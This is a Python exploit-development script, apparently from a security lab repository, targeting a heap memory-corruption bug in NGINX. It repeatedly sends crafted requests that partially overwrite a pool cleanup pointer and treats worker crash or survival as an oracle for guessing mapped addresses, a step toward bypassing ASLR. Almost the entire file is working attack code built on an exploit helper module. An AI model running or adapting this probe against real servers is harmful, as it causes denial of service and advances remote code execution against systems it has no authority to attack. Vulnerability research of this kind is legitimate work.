#!/usr/bin/env python3
"""No-LFI heap cleanup-pointer oracle probe for NGINX Rift-style labs.

This probe uses only request/worker-crash behavior.  It sprays zeroed request
bodies, partially overwrites a victim pool cleanup pointer with URI-safe bytes,
and reports guesses that do not crash the worker.  A no-crash result is not RCE;
it is a possible mapped cleanup-list landing point that can be used to study
whether progressive ASLR probing is viable without a file-read primitive.
"""

from __future__ import annotations

import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import nginx_rifter as rifter


def candidate_lows(target_len: int, start: int, max_probes: int, address_mod: int | None):
    limit = 1 << (8 * target_len)
    yielded = 0
    for value in range(start, limit):
        if address_mod is not None and value % 8 != address_mod:
            continue
        if not rifter.addr_low_is_safe(value, target_len):
            continue
        yielded += 1
        if max_probes and yielded > max_probes:
            break
        yield value


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Crash/no-crash cleanup-pointer oracle probe; no LFI, core, /proc/mem, or debugger."
    )
    parser.add_argument("--target", default="127.0.0.1:19321", help="target as HOST:PORT")
    parser.add_argument("--port", type=int, default=19321, help="fallback port when --target omits one")
    parser.add_argument("--target-len", type=int, default=2, help="low pointer bytes to overwrite")
    parser.add_argument("--address-mod", type=int, default=7, help="candidate low-byte value %% 8, or -1 for all")
    parser.add_argument("--start", type=lambda x: int(x, 0), default=0, help="first low-byte integer to consider")
    parser.add_argument("--max-probes", type=int, default=0, help="cap safe candidates; 0 means no cap")
    parser.add_argument("--a-count", type=int, default=rifter.DEFAULT_A_COUNT)
    parser.add_argument("--plus-count", type=int, default=rifter.DEFAULT_PLUS_COUNT)
    parser.add_argument("--recovery-timeout", type=int, default=20)
    parser.add_argument("--settle", type=float, default=0.05)
    parser.add_argument("--progress-every", type=int, default=100)
    args = parser.parse_args()

    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(line_buffering=True)

    if args.target_len < 1 or args.target_len > 6:
        parser.error("--target-len must be between 1 and 6")
    if args.address_mod < -1 or args.address_mod > 7:
        parser.error("--address-mod must be -1 or 0..7")
    if args.progress_every < 1:
        parser.error("--progress-every must be positive")

    host, port = rifter.parse_target(args.target, args.port)
    address_mod = None if args.address_mod == -1 else args.address_mod
    body = b"\x00" * rifter.BODY_LEN

    print(f"target        {host}:{port}")
    print("primitive     crash/no-crash only; no LFI; no procfs; no core; no debugger")
    print(f"target bytes  {args.target_len}")
    print(f"address mod   {'all' if address_mod is None else address_mod}")
    print()

    if not rifter.wait_alive(host, port, timeout=args.recovery_timeout):
        print("[!] nginx is not responding before probe")
        return 2

    start_time = time.time()
    tested = 0
    hits: list[int] = []

    for value in candidate_lows(args.target_len, args.start, args.max_probes, address_mod):
        tested += 1
        target_bytes = value.to_bytes(args.target_len, "little")

        if tested == 1 or tested % args.progress_every == 0:
            rate = tested / max(0.001, time.time() - start_time)
            print(f"    try={tested} low={target_bytes.hex()} value={value:#x} rate={rate:.2f}/s")

        if not rifter.wait_alive(host, port, timeout=args.recovery_timeout):
            print("[!] nginx did not recover before probe")
            return 2

        crashed = rifter.attempt(
            host,
            port,
            target_bytes,
            body,
            h2_victim=True,
            a_count=args.a_count,
            plus_count=args.plus_count,
        )
        time.sleep(args.settle)

        if not crashed:
            hits.append(value)
            print(f"[+] no-crash candidate low={target_bytes.hex()} value={value:#x}")

    print()
    print(f"tested        {tested}")
    print(f"no-crash hits {len(hits)}")
    for value in hits[:32]:
        print(f"  {value:#x} ({value.to_bytes(args.target_len, 'little').hex()})")
    if len(hits) > 32:
        print(f"  ... {len(hits) - 32} more")
    return 0 if hits else 1


if __name__ == "__main__":
    raise SystemExit(main())
